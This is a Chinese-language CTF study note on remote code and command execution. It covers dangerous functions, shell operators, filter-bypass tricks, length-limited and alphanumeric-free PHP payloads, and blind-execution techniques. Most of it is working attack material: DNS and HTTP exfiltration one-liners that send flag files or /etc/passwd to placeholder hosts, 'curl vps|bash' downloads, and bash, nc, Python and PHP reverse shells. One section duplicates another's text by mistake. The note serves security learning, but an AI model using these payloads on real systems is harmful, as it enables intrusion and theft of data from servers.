---
title: "RCE笔记"
date: 2026-05-23 21:21:41 +0800
categories: [WEB_Note]
tags: ["WEB", "RCE"]
web_folder: "RCE"
source_note: "RCE/RCE笔记.md"
permalink: /web_note/rce/01/
render_with_liquid: false
---
# 1. 基础

## 定义与分类

RCE (Remote Code/Command Execution) <u>远程代码/命令执行</u>漏洞，是一种允许攻击者在目标服务器上执行任意代码或系统命令的严重安全漏洞

- **远程代码执行** **(Remote Code Execution)**
  - 在<u>**应用程序**层面</u>执行代码
  - 执行的是<u>编程语言本身</u>的代码（如PHP、Python、Java代码）
  - 示例：eval("phpinfo();")

- **远程命令执行 (Remote Command Execution)**

  - 在<u>**操作系统**层面</u>执行命令

  - 执行的是<u>系统Shell命令</u>（如Linux的bash命令、Windows的cmd命令）

  - 示例：`system("ls -la")`，`echo shell_exec("")`，`passthru("")`

**二者关系**

- 代码执行可以包含命令执行（如：`eval("system('whoami');")`）
- 命令执行是代码执行的一个子集
- 在CTF和实战中，两者经常混用，统称为RCE

## 危险函数

> PHP、Python、Java、Node.js

**PHP**

- **代码执行类**

```php
eval($code)              // 将字符串作为PHP代码执行，最危险
assert($assertion)       // PHP 8.0前可执行字符串代码
preg_replace('/pattern/e', $replacement, $subject)  // /e模式已废弃
create_function($args, $code)  // 创建匿名函数，PHP 8.0已移除
```

- **命令执行类**

```php
system($command)         // 执行命令并输出结果
exec($command, $output)  // 执行命令，结果存入数组
shell_exec($command)     // 执行命令，返回完整输出字符串
passthru($command)       // 执行命令并直接输出原始结果
popen($command, $mode)   // 打开进程文件指针
proc_open($cmd, $descriptorspec, $pipes)  // 执行命令并打开文件指针
pcntl_exec($path, $args) // 在当前进程空间执行程序
```

- **回调函数类**

```php
call_user_func($callback, $param)           // 调用回调函数
call_user_func_array($callback, $params)    // 调用回调函数，参数为数组
array_map($callback, $array)                // 对数组每个元素应用回调
array_filter($array, $callback)             // 用回调函数过滤数组
array_reduce($array, $callback)             // 用回调函数迭代归约数组
usort($array, $callback)                    // 用自定义函数排序数组
uasort($array, $callback)                   // 保持索引关联排序
uksort($array, $callback)                   // 按键名排序
array_walk($array, $callback)               // 对数组每个元素应用回调
array_walk_recursive($array, $callback)     // 递归应用回调
```

- **其它危险函数**

```php
ob_start($callback)      // 打开输出缓冲，可指定回调
$a($b)                   // 动态函数调用
$$var                    // 可变变量
```



**Python**

```python
eval(expression)                    # 执行Python表达式
exec(code)                          # 执行Python代码块
compile(source, filename, mode)     # 编译代码对象后执行

os.system(command)                  # 执行系统命令
os.popen(command)                   # 执行命令并返回文件对象
os.exec*系列                        # 执行程序

subprocess.call(args)               # 执行命令
subprocess.Popen(args)              # 创建子进程
subprocess.run(args)                # Python 3.5+推荐

commands.getoutput(cmd)             # Python 2执行命令
commands.getstatusoutput(cmd)       # Python 2执行命令并返回状态

__import__('os').system('ls')       # 动态导入执行
```



**Java**

```java
// 命令执行
Runtime.getRuntime().exec(command)
ProcessBuilder(command).start()

// 反射机制
Class.forName(className)
Method.invoke(object, args)

// 表达式引擎
OGNL表达式注入
SpEL表达式注入  
MVEL表达式注入

// 脚本引擎
ScriptEngineManager
```



**Node.js**

```javascript
eval(code)                          // 执行JavaScript代码
Function(code)()                    // 动态创建函数

child_process.exec(command)         // 执行命令
child_process.execSync(command)     // 同步执行
child_process.spawn(command, args)  // 创建子进程
child_process.execFile(file, args)  // 执行文件

vm.runInThisContext(code)           // 在当前上下文执行
```

## 命令连接符

### Linux命令连接符

```bash
;        # 顺序执行，前面命令执行完执行后面（无论成败）
|        # 管道符，前面命令的输出作为后面命令的输入
||       # 逻辑或，前面命令失败才执行后面
&        # 后台执行，前后命令都执行
&&       # 逻辑与，前面命令成功才执行后面
```

eg：

```bash
# 分号 - 顺序执行
127.0.0.1; ls          # ping后执行ls

# 管道 - 传递输出
ls | grep flag         # ls结果传给grep

# 逻辑或 - 失败才执行
cat xxx || ls          # cat失败则执行ls

# 逻辑与 - 成功才执行  
cd /tmp && ls          # cd成功才执行ls

# 后台执行
sleep 10 & ls          # sleep后台运行，立即执行ls
```

### Windows命令连接符

```bash
|        # 管道符，直接执行后面语句
||       # 前面失败才执行后面
&        # 前后都执行（无论前面真假）
&&       # 前面成功才执行后面
```

eg:

```bash
dir & whoami           # 都执行
dir && whoami          # dir成功才执行whoami
dir || whoami          # dir失败才执行whoami
```

### 命令替换

```bash
`command`              # 反引号，执行命令并返回结果
$(command)             # 命令替换，推荐写法
```

eg:

```bash
echo `whoami`          # 输出whoami结果
cat `ls`               # 读取ls列出的所有文件
echo $(whoami)         # 同上
cat flag_$(ls|grep flag)  # 动态构造文件名
```

### 重定向符号

```bash
>        # 输出重定向（覆盖）
>>       # 输出重定向（追加）
<        # 输入重定向
<>       # 读写重定向
2>&1     # 错误输出重定向到标准输出
&>       # 标准输出和错误输出都重定向
```

eg:

```bash
ls > 1.txt             # 将ls结果写入1.txt
cat < flag.txt         # 从flag.txt读取内容
ls 2>&1                # 错误也输出
echo test >> log.txt   # 追加到log.txt
ls <> test.txt         # 以读写方式打开文件，将文件内容作为输入，输出写入文件
ls &> test.txt         # 将正确输出和错误输出都重定向到 test.txt 文件中
```

# 2. Linux命令

## 文件读取命令

- **常规读取**

```bash
cat                   # 正向显示文件全部内容

tac                   # 反向显示（最后一行到第一行）

more                  # 分页显示（空格翻页，q退出）

less                  # 分页显示（支持上下翻页）

head                  # 显示文件前10行
head -n 20 file       # 显示前20行

tail                  # 显示文件后10行
tail -n 20 file       # 显示后20行
tail -f file          # 实时监控文件变化

nl                    # 显示文件并添加行号
```

- **二进制/十六进制读取**

```bash
od                     # 八进制显示
od -A x -t x1z file    # 十六进制+ASCII显示

xxd                    # 十六进制显示

hexdump                # 十六进制显示
hexdump -C             # 规范十六进制+ASCII

strings                # 提取可打印字符串
```

- **文本处理命令**

```bash
grep "pattern" file       # 搜索匹配行
grep -r "flag" /var/www/  # 递归搜索
awk '{print $1}' file     # 打印第一列
sed -n '1,10p' file       # 打印1-10行
cut -d: -f1 file          # 以:分割取第一字段
sort file                 # 排序
uniq file                 # 去重
rev file                  # 反转每行字符
paste file1 file2         # 合并文件
diff file1 file2          # 比较文件差异
```

- **编程语言获取**

```bash
# Perl
perl -ne 'print' flag.php
perl -e 'print `cat flag.php`'

# Python
python -c "print(open('flag.php').read())"
python3 -c "print(open('flag.php').read())"

# PHP
php -r "echo file_get_contents('flag.php');"
php -r "readfile('flag.php');"

# Ruby
ruby -e 'puts File.read("flag.php")'

# Node.js
node -e "console.log(require('fs').readFileSync('flag.php','utf8'))"
```

- **编辑器读取**

```bash
# Vim/Vi
vim flag.php           # 打开后:q退出
vi +':!cat %' flag.php # 直接执行命令读取

# Nano
nano flag.php

# Emacs
emacs flag.php
```

- **其他读取方式**

```bash
# 使用curl/wget
curl file:///etc/passwd
wget file:///flag.php -O -

# 使用base64
base64 flag.php        # 编码后读取
base64 -d flag.b64     # 解码

# 使用iconv
iconv -f utf-8 -t utf-8 flag.php

# 使用dd
dd if=flag.php

# 使用cp到标准输出
cp flag.php /dev/stdout
```

## 文件查找命令

```bash
# find - 最强大的查找命令
find / -name flag.php              # 按文件名查找
find / -name "flag*"               # 通配符查找
find / -name "*flag*" 2>/dev/null  # 忽略错误输出
find / -type f -name "*.php"       # 查找所有php文件
find / -user root                  # 查找root用户的文件
find / -perm -4000 2>/dev/null     # 查找SUID文件（提权）
find / -size +10M                  # 查找大于10M的文件
find / -mtime -1                   # 查找24小时内修改的文件

# locate - 快速查找（基于数据库）
locate flag.php
updatedb                           # 更新数据库

# which - 查找命令位置
which cat
which python

# whereis - 查找二进制、源码、手册
whereis cat

# grep递归搜索
grep -r "flag{" /var/www/ 2>/dev/null
grep -rn "password" /home/         # 显示行号
```

CTF中payload

```bash
# 查找flag文件
find / -name "*flag*" 2>/dev/null
find / -name "flag*" -type f 2>/dev/null

# 查找最近修改的文件
find /var/www/ -mtime -1

# 搜索文件内容
grep -r "ctfhub{" / 2>/dev/null
```

## 目录列举命令

````bash
# ls - 列出目录
ls                     # 列出当前目录
ls -la                 # 详细信息+隐藏文件
ls -lh                 # 人类可读的文件大小
ls -lt                 # 按修改时间排序
ls -lR                 # 递归列出所有子目录
ls -i                  # 显示inode号

# dir - ls的别名
dir

# echo * - 通配符展开
echo *                 # 列出当前目录所有文件
echo .*                # 列出隐藏文件
echo /etc/*            # 列出/etc目录

# printf - 格式化输出
printf '%s\n' *        # 每行一个文件名

# tree - 树形显示
tree                   # 树形显示目录结构
tree -L 2              # 只显示2层
````

CTF

```bash
# 当ls被过滤
dir
echo *
printf '%s\n' *

# 查看隐藏文件
ls -la
echo .*
```

## 信息收集命令

- **系统信息**

```bash
# 系统版本
uname -a               # 内核版本
cat /etc/issue         # 发行版信息
cat /etc/*-release     # 详细版本信息
cat /proc/version      # 内核详细信息
lsb_release -a         # LSB版本信息

# 主机名
hostname
cat /etc/hostname

# 系统架构
arch
uname -m
```

- **用户信息**

```bash
# 当前用户
id                     # 用户ID和组ID
whoami                 # 当前用户名
who                    # 登录用户
w                      # 登录用户详细信息
users                  # 简单列出登录用户

# 用户列表
cat /etc/passwd        # 所有用户
cat /etc/shadow        # 密码哈希（需root）
cat /etc/group         # 用户组

# 登录历史
last                   # 最近登录
lastlog                # 所有用户最后登录
history                # 命令历史
cat ~/.bash_history    # bash历史
```

- **网络信息**

```bash
# 网络接口
ifconfig               # 网络接口信息
ip addr                # 新版命令
ip a

# 网络连接
netstat -antp          # 所有TCP连接
netstat -anup          # 所有UDP连接
ss -antp               # 新版netstat
lsof -i                # 列出网络连接

# 路由信息
route -n
ip route
netstat -rn

# DNS
cat /etc/resolv.conf
cat /etc/hosts

# 防火墙
iptables -L            # 查看规则
```

- **环境变量**

```bash
# 查看环境变量
env                    # 所有环境变量
printenv               # 同上
echo $PATH             # 查看PATH
echo $HOME             # 查看HOME
echo $USER             # 查看用户名
echo $SHELL            # 查看Shell

# 设置环境变量
export VAR=value
```

- **进程信息**

```bash
# 进程列表
ps aux                 # 所有进程
ps -ef                 # 所有进程（不同格式）
top                    # 实时进程监控
htop                   # 增强版top

# 查找进程
ps aux | grep apache
pgrep apache
pidof apache2

# 进程树
pstree
```

## 下载/上传命令

- **下载命令**

```bash
# wget
wget http://vps/shell.php
wget http://vps/shell.php -O /tmp/shell.php
wget http://vps/shell.php -q          # 静默模式

# curl
curl http://vps/shell.php -o shell.php
curl http://vps/shell.php > shell.php
curl -O http://vps/shell.php           # 保持原文件名

# 其他下载方式
# Python
python -c "import urllib;urllib.urlretrieve('http://vps/shell.php','shell.php')"
python3 -c "import urllib.request;urllib.request.urlretrieve('http://vps/shell.php','shell.php')"

# Perl
perl -e 'use LWP::Simple;getstore("http://vps/shell.php","shell.php")'

# PHP
php -r "file_put_contents('shell.php',file_get_contents('http://vps/shell.php'));"

# Ruby
ruby -e 'require "open-uri";File.write("shell.php",open("http://vps/shell.php").read)'
```

- **上传命令**

```bash
# nc传输
# 接收端
nc -lvp 1234 > file

# 发送端
nc vps 1234 < file

# curl上传
curl -F "file=@shell.php" http://vps/upload.php
curl -X POST -d @file http://vps/

# wget上传（需服务端支持）
wget --post-file=file http://vps/upload.php

# scp（需SSH）
scp file user@vps:/path/
```

# 3. 绕过

##  (1)空格绕过

### IFS变量

**`$IFS`** 是Linux的<u>内部字段分隔符</u>（Internal Field Separator），默认为空格、制表符、换行符

```bash
# 基础用法
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd      # $9是空变量
cat$IFS$1/etc/passwd      # $1也可以

# 实战示例
127.0.0.1;cat${IFS}flag.php
127.0.0.1;ls$IFS$9/
```

- $IFS 在bash中会被解析为空格
- $9 $1 等是位置参数，未传参时为空
- ${IFS} 是更规范的写法

### 重定向符号

````bash
# < 输入重定向
cat</etc/passwd
cat<flag.php

# <> 读写重定向
cat<>flag.php

# 注意：不能用于ls等命令
ls</tmp                    # 错误
cat</tmp/flag.php          # 正确
````

- `<` 将文件内容重定向给命令
- 不需要空格分隔

### 花括号展开

```bash
# 基础用法
{cat,/etc/passwd}
{ls,-la,/tmp}

# 实战示例
127.0.0.1;{cat,flag.php}
{ls,-la}
```

- Bash的花括号展开特性
- `{cmd,arg1,arg2}` 会展开为 `cmd arg1 arg2`

### 编码绕过

```bash
# %09 - Tab键
cat%09flag.php
ls%09-la

# %20 - 空格（URL编码）
cat%20flag.php

# 在PHP中使用
?cmd=system('cat%09flag.php');
```

### 环境变量截取

```bash
# 查看PATH
echo $PATH
# 输出：/usr/local/bin:/usr/bin:/bin

# 截取空格（假设PATH中某位置有空格或特殊字符）
${PATH:0:1}                # 截取第1个字符 /
${PATH:5:1}                # 截取第6个字符

# 实战：构造空格
# 如果某个环境变量包含空格，可以截取
```

## (2)关键字/命令绕过

### 引号与反斜杠

```bash
# 单引号
c''at flag.php
c'a't flag.php

# 双引号
c""at flag.php
c"a"t flag.php

# 反斜杠
c\at flag.php
ca\t flag.php
c\a\t flag.php

# 混合使用
c'a'\t flag.php
c"a"t flag.php
```

- <u>引号</u>和<u>反斜杠</u>在bash中用于转义
- <u>空引号</u>不影响命令执行
- 可以打断关键字匹配

### 变量拼接

```bash
# 基础拼接
a=ca;b=t;$a$b flag.php
a=fl;b=ag;cat $a$b.php

# 复杂拼接
cmd=c;cmd=${cmd}at;$cmd flag.php

# 实战示例
127.0.0.1;a=fl;b=ag;cat$IFS$a$b.php
```

- 将关键字拆分成多个变量
- 执行时动态拼接
- 绕过静态关键字检测

### 特殊变量

```bash
# $* - 所有位置参数
cat$*flag.php

# $@ - 所有位置参数（带引号）
cat$@flag.php

# $9 $1 等 - 位置参数（未传参时为空）
cat$9flag.php
cat$1flag.php

# ${x} - 未定义变量
cat${x}flag.php
cat${undefined}flag.php
```

### 通配符

```bash
# * - 匹配任意字符
cat fla*
cat fl*.php
cat *flag*

# ? - 匹配单个字符
cat fla?
cat flag.ph?

# [] - 匹配字符集
cat fla[a-z]
cat [f]lag.php
cat fl[a]g.php

# 组合使用
cat f???.php
cat [f][l][a][g].php
```

- **进阶**

```bash
# 匹配命令本身
/???/c?t /???/p??swd      # /bin/cat /etc/passwd
/???/l? /???              # /bin/ls /etc

# 匹配所有文件
cat *                     # 读取当前目录所有文件
cat `ls`                  # 同上
```

### 编码绕过

- **Base64编码**

```bash
# 编码命令
echo "cat flag.php" | base64
# 输出：Y2F0IGZsYWcucGhw (cat flag.php)

# 解码执行
echo "Y2F0IGZsYWcucGhw" | base64 -d | bash     (-d解码)
`echo "Y2F0IGZsYWcucGhw" | base64 -d`
$(echo "Y2F0IGZsYWcucGhw" | base64 -d)

# 分段编码
echo "dAo=" | base64 -d    # 输出 t
ca$(echo "dAo=" | base64 -d) flag.php
```

- **Hex编码**

```bash
# 使用xxd
echo "636174202f666c6167" | xxd -r -p | bash
# 636174202f666c6167 是 "cat /flag" 的hex

# 使用printf
$(printf "\x63\x61\x74\x20\x66\x6c\x61\x67")
# \x63\x61\x74 = cat

# Python生成hex
python -c "print('cat flag'.encode('hex'))"
```

- **八进制/十六进制编码**

```bash
# 八进制
$(printf "\143\141\164")      # cat
$(printf "\154\163")           # ls

# 十六进制
$(printf "\x63\x61\x74")       # cat
$(printf "\x6c\x73")           # ls

# 完整命令
$(printf "\143\141\164\40\146\154\141\147")  # cat flag
```

生成脚本

```python
# Python生成八进制
s = "cat flag"
print(''.join(['\\'+oct(ord(c))[2:] for c in s]))

# Python生成十六进制
print(''.join(['\\x'+hex(ord(c))[2:] for c in s]))
```

### 内联执行

```bash
# 反引号
`ls`
cat `ls`
cat `echo flag.php`
cat `ls | grep flag`
cat `echo fla\g.php`

# $()
$(ls)
cat $(ls)
cat $(echo flag.php)
cat $(ls | head -1)

# 嵌套使用
cat `ls | grep flag`
cat $(ls | grep flag)
cat $(find / -name flag.php 2>/dev/null)
```

### 换行符绕过

````bash
# 使用反斜杠换行
ca\
t fl\
ag.php

# 实际执行
cat flag.php
````

文件写入技巧

```bash
# 写入多行命令
echo "ca\\" > shell
echo "t\\" >> shell
echo " fl\\" >> shell
echo "ag" >> shell

# 执行
sh shell
```

### 环境变量截取

```bash
# 查看PATH
echo $PATH
# /usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin

# 截取字符构造命令
${PATH:0:1}                # /
${PATH:5:1}                # l
${PATH:2:1}                # s

# 构造ls命令
${PATH:5:1}${PATH:2:1}     # ls
`${PATH:5:1}${PATH:2:1}`   # 执行ls
```

eg:

```bash
# 构造cat
# 需要找到包含c a t的环境变量
echo $PATH | grep -o . |
```

## (3)长度限制绕过

当命令执行有严格的长度限制时（如只能输入7个字符、5个字符甚至4个字符），需要使用特殊技巧。

**原理：利用文件名排序**

Linux的`ls -t`命令会按时间倒序排列文件，我们可以：

1. 用`>`创建多个文件（文件名就是命令）
2. 用`ls -t>x`将排序后的文件名写入文件x
3. 用`sh x`执行文件x中的命令

### 7字符RCE

**限制**：每次只能执行7个字符的命令

**思路**：构造反弹shell

```bash
# 第1步：创建文件名
>wget\\  # 创建文件wget\  ,\\的作用是转义成文件名里的\ 
>vps\\
>-O\\
>shell\\

# 第2步：按时间排序写入文件
ls -t>x

# 第3步：执行
sh x

# 实际执行的命令相当于：
# wget vps -O shell
```

完整payload

```bash
>wget\\
>10.0.0.1\\
>-O\\
>/tmp/a\\
ls -t>x
sh x
```

案例

```bash
# 目标：执行 curl vps|bash

# 步骤1：创建文件名
echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+ | base64 -d > 1.php

# 步骤2：利用>创建
>curl\\
>vps\\
>\|\\
>bash\\

# 步骤3：排序
ls -t>x

# 步骤4：执行
sh x
```

### 5字符RCE

**限制**：每次只能执行5个字符

**技巧**：利用`>`和`*`通配符

```bash
# 创建文件
>dir
>sl

# 反转文件名
>rev

# 排序并执行
ls -t>x
sh x

# 相当于执行：rev sl dir
# 输出：rid ls
```

示例

```bash
# 下载文件
>hp\\
>s.p\\
>ell\\
>sh\\
>d\>\\
>\ -\\
>get\\
>w\\

# 生成命令
ls -t>a
sh a

# 相当于：wget -d shell.php
```

### 4字符RCE

**限制**：每次只能执行4个字符

**核心技巧**：

- 利用`>`创建文件
- 利用`*`通配符
- 利用`ls`排序

```bash
# 创建基础文件
>g\\
>ht\\
>-\\
>sl\\

# 创建命令文件
*>v

# 执行
sh v
```

**原理**：

1. `*>v` 相当于 `g ht - sl >v`
2. 按字母序排列后变成：`- g ht sl >v`
3. 实际执行：`ls -ght >v`

## (4)无字母数字RCE

### PHP取反绕过

**适用条件**：过滤字母数字，但允许`~`符号

**原理**：利用PHP的**<u>按位取反</u>**运算符`~` (**按二进制位0变1，1变成0**)

```php
<?php
// 取反函数名
echo urlencode(~'system');
// 输出：%8C%86%8C%8B%9A%92

// 取反参数
echo urlencode(~'cat /flag');
// 输出：%9C%9E%8B%DF%D0%99%93%9E%98
?>
    
# 拼接起来的完整payload在下面的使用示例最后写了
```

使用示例

```php
<?php
// 源码
if(preg_match('/[a-zA-Z0-9]/', $_GET['code'])){
    die("hacker!");
}
eval($_GET['code']);

// Payload
?code=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);  # 拼接起来的payload
```

### PHP异或绕过

**适用条件**：过滤字母数字，但允许特殊符号

**原理**：利用异或运算构造字母

```php
// 异或对照表
'!' ^ '@' = 'a'
'"' ^ '@' = 'b'
'#' ^ '@' = 'c'
'$' ^ '@' = 'd'
'%' ^ '@' = 'e'
'&' ^ '@' = 'f'
"'" ^ '@' = 'g'
'(' ^ '@' = 'h'
')' ^ '@' = 'i'
'*' ^ '@' = 'j'
'+' ^ '@' = 'k'
',' ^ '@' = 'l'
'-' ^ '@' = 'm'
'.' ^ '@' = 'n'
'/' ^ '@' = 'o'
'0' ^ '@' = 'p'
'1' ^ '@' = 'q'
'2' ^ '@' = 'r'
'3' ^ '@' = 's'
'4' ^ '@' = 't'
'5' ^ '@' = 'u'
'6' ^ '@' = 'v'
'7' ^ '@' = 'w'
'8' ^ '@' = 'x'
'9' ^ '@' = 'y'
':' ^ '@' = 'z'
#按ASCII对应,例如最后一个// 58 ^ 64 = 122 → 'z'
```

**生成脚本**

```python
valid = "!@$%^*(){}[];\'\",.<>/?-=_`~ "
answer = input("请输入要构造的字符串：")

tmp1, tmp2 = '', ''
for c in answer:
    for i in valid:
        for j in valid:
            if (ord(i) ^ ord(j) == ord(c)):
                tmp1 += i
                tmp2 += j
                break
        else:
            continue
        break

print("tmp1:", tmp1)
print("tmp2:", tmp2)
print(f"Payload: ('{tmp1}'^'{tmp2}')")
```

**示例**

```php
// 构造 assert
$_ = "!^^@^^" ^ "@--%,*";  // assert

// 构造 _POST
$__ = '_' . ("}/(*" ^ "-`{~");  // _POST

// 执行
$___ = $$__;
$_($___[_]);

// 相当于：assert($_POST[_]);
```

**完整payload**

```php
?code=$_="!^^@^^"^"@--%,*";$__='_'.("}/(*"^"-`{~");$___=$$__;$_($___[_]);
&_=system('cat /flag');
```

- **异或使用讲解**

这个异或使用是**左右一位位对应**然后**异或**的，拿上面示例中的**assert**为例讲解

`$_ = "!^^@^^" ^ "@--%,*";  // assert`     =>   左：`!  ^  ^  @  ^  ^`    右：`@  -  -  %  ,  *`

| 左字符 ^ 右字符 | 异或结果 |
| --------------- | -------- |
| `!` ^ `@`       | **a**    |
| `^` ^ `-`       | **s**    |
| `^` ^ `-`       | **s**    |
| `@` ^ `%`       | **e**    |
| `^` ^ `,`       | **r**    |
| `^` ^ `*`       | **t**    |

### PHP自增绕过

**适用条件**：过滤字母数字，但允许`[]`、`++`、`$`等

**原理**：

1. 数组转字符串得到"Array"
2. 取首字母得到"A"
3. 通过自增得到所有字母

**核心代码**：

```php
<?php
// 步骤1：获取"Array"
$_ = [].''；  // 数组转字符串

// 步骤2：获取"A"
$__ = false;  // 但0被过滤，用false代替
$___ = $_[$__];  // "Array"[0] = "A"

// 步骤3：自增构造字母
$____ = $___;  // "A"
$____++;  // "B"
$____++;  // "C"
// ... 以此类推
?>
    # 这里用一堆下划线比较容易搞混，不过毕竟是无字母数字RCE，就是变量名
```

**讲解**

(1)获取Array

靠的是PHP里的一个<u>特殊规则</u>：**数组被当成字符串使用时，会强制转换成字符串 "Array"**

```
$_ = [].''；  # 把空数组和空字符串拼接，触发规则，所以$_的值为"Array"
```

![Array](/assets/images/web-note/web-note-001.png)

(2)获取A

靠的是另外两个<u>规则</u>：**1.字符串可以像数组一样用下标取字符**(`"Array"[0]` 就是取第 0 个字符，也就是 `A`)，**2.`false` 在 PHP 里会被自动转换成 `0`**布尔值转整数：`false` → `0`，`true` → `1`）

```
$__ = false;
// 等价于 $__ = 0;

$___ = $_[$__];
// 等价于 $___ = "Array"[0];
// 也就是 $___ = "A";
```

(3)自增构造字母

```
$____ = $___;  // "A"  # 这里又赋了一次值，是因为避免直接++会把A给改掉，没A了，自增变成B
$____++;  // "B"
$____++;  // "C"
```

**示例**

```php
<?php
$_ = [].''；  // "Array"
$___ = $_[0];  // "A"

// 构造 S (A+18)
$__ = $___;  # 这里就是A重新赋值，用于后续拼接，如果直接自增就没这个A了
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;$__++;  // "S"
$___ .= $__;  // "AS"
$___ .= $__;  // "ASS"

// 构造 E (A+4)
$__ = $_[0];
$__++;$__++;$__++;$__++;  // "E"
$___ .= $__;  // "ASSE"

// 构造 R (A+17)
$__ = $_[0];
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;  // "R"
$___ .= $__;  // "ASSER"

// 构造 T (A+19)
$__ = $_[0];
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;$__++;$__++;  // "T"
$___ .= $__;  // "ASSERT"

// 构造 _POST
$____ = "_";
$__ = $_[0];
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;  // "P"
$____ .= $__;

$__ = $_[0];
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;$__++;$__++;$__++;$__++;$__++;  // "O"
$____ .= $__;

// ... 继续构造 S T

// 执行
$_ = $$____;  // $_POST
$___($_[_]);  // ASSERT($_POST[_])
?>
```

### Bash无字母数字

- **1.利用特殊变量**

```bash
$0       # 当前shell名称，通常是bash
${!#}    # 最后一个参数，通常是bash
$*       # 所有参数
$@       # 所有参数
```

示例

```bash
# 执行bash
$0

# 利用通配符
/???/c?t /???/p??swd
# 相当于：/bin/cat /etc/passwd
```

- **2.利用环境变量**

```bash
# 查看PATH
echo $PATH
# /usr/local/bin:/usr/bin:/bin

# 截取字符
${PATH:0:1}   # /
${PATH:5:1}   # l
${PATH:2:1}   # s

# 构造命令
${PATH:5:1}${PATH:2:1}  # ls
```

- **3.利用进制转换**

```bash
# 八进制
$(printf "\154\163")  # ls

# 十六进制
$(printf "\x6c\x73")  # ls
```

## (5)无回显RCE

### 时间盲注

**原理**：通过延时判断命令是否执行

```bash
# Linux
sleep 5
ping -c 5 127.0.0.1

# 条件延时
ls / && sleep 3        # ls成功则延时3秒
cat flag && sleep 5    # 读取成功则延时5秒
```

案例

```bash
# 判断文件是否存在
127.0.0.1;test -f flag.php && sleep 3

# 判断命令是否成功
127.0.0.1;whoami && sleep 5
```

### DNS外带

**原理**：将命令结果通过DNS查询发送到外部

**工具**：DNSlog平台（如：dnslog.cn、ceye.io）

```bash
# 基础用法
curl `whoami`.dnslog.cn
ping `whoami`.dnslog.cn
nslookup `whoami`.dnslog.cn

# 读取文件
curl `cat flag.php|base64`.dnslog.cn
ping `cat /etc/passwd|base64|head -1`.dnslog.cn

# Windows
ping %USERNAME%.dnslog.cn
nslookup %COMPUTERNAME%.dnslog.cn
```

案例

```bash
# 获取当前用户
127.0.0.1;curl `whoami`.xxx.dnslog.cn

# 获取flag（需base64避免特殊字符）
127.0.0.1;curl `cat flag.php|base64`.xxx.dnslog.cn

# 分段传输（长内容）
127.0.0.1;cat flag.php|base64|cut -c 1-30|xargs -I {} curl {}.xxx.dnslog.cn
```

### HTTP外带

**原理**：将命令结果通过HTTP请求发送到VPS

```bash
# GET请求
curl http://vps/`whoami`
wget http://vps/$(whoami)
curl http://vps/?data=`cat flag.php|base64`

# POST请求
curl -X POST -d "`cat flag.php`" http://vps/
wget --post-data="`cat flag.php`" http://vps/

# 使用nc
cat flag.php | nc vps 1234
```

**VPS监听**：

```bash
# 方法1：nc监听
nc -lvp 1234

# 方法2：Python HTTP服务器
python -m SimpleHTTPServer 80
python3 -m http.server 80

# 方法3：PHP接收
<?php file_put_contents('result.txt', $_GET['data']); ?>
```

示例

```bash
# 外带whoami结果
127.0.0.1;curl http://vps:8080/`whoami`

# 外带flag内容
127.0.0.1;curl http://vps:8080/?flag=`cat flag.php|base64`

# 分段外带
127.0.0.1;cat flag.php|base64|while read line;do curl http://vps/$line;done
```

### 写入文件

**原理**：将命令结果写入Web目录下的文件，然后访问

````bash
# 基础写入
ls / > 1.txt
cat flag.php > result.txt

# 追加写入
whoami >> info.txt
cat /etc/passwd >> info.txt

# 使用tee（同时输出和写入）
ls / | tee output.txt
cat flag.php | tee result.txt

# 写入Web目录
ls / > /var/www/html/1.txt
cat flag.php > /tmp/result.txt
````

示例

```bash
# 写入当前目录
127.0.0.1;ls / > 1.txt
# 然后访问：http://target/1.txt

# 写入Web根目录
127.0.0.1;cat flag.php > /var/www/html/result.txt
# 访问：http://target/result.txt

# 使用tee
127.0.0.1;cat flag.php | tee flag.txt
```

### 反弹shell

**原理**：建立反向连接，获得交互式Shell

- **Bash反弹**

```bash
bash -i >& /dev/tcp/vps/port 0>&1
bash -c 'bash -i >& /dev/tcp/vps/port 0>&1'
exec 5<>/dev/tcp/vps/port;cat <&5|while read line;do $line 2>&5>&5;done
```

- **NC反弹**

```bash
nc -e /bin/bash vps port
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc vps port >/tmp/f
```

- **Python反弹**

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("vps",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- **PHP反弹**

```bash
php -r '$sock=fsockopen("vps",port);exec("/bin/sh -i <&3 >&3 2>&3");'
```

- **VPS反弹**

```bash
nc -lvp 1234
```

### ICMP外带

**原理**：通过ping的数据包携带数据

```bash
# Linux
ping -c 1 -p $(echo "data"|xxd -p) vps

# 需要在VPS上抓包
tcpdump -i eth0 icmp -X
```

### 利用错误信息

**原理**：通过ping的数据包携带数据

```bash
# Linux
ping -c 1 -p $(echo "data"|xxd -p) vps

# 需要在VPS上抓包
tcpdump -i eth0 icmp -X
```

总结

| 方法      | 优点                 | 缺点                       | 适用场景     |
| --------- | -------------------- | -------------------------- | ------------ |
| 时间盲注  | 简单，无需外部资源   | 只能判断真假，无法获取数据 | 漏洞验证     |
| DNS外带   | 绕过防火墙，隐蔽性好 | 需要DNS解析，数据量有限    | 数据外带     |
| HTTP外带  | 数据量大，灵活       | 可能被防火墙拦截           | 大量数据外带 |
| 写入文件  | 简单直接             | 需要Web目录写权限          | 有写权限时   |
| 反弹Shell | 交互式，功能最强     | 容易被检测                 | 完全控制     |

# 4. 反弹Shell

反弹Shell是获取目标服务器交互式控制权限的重要手段

## Bash反弹shell

- **/dev/tcp重定向**

```bash
# 基础版本
bash -i >& /dev/tcp/vps/port 0>&1

# 详细解释：
# bash -i：启动交互式bash
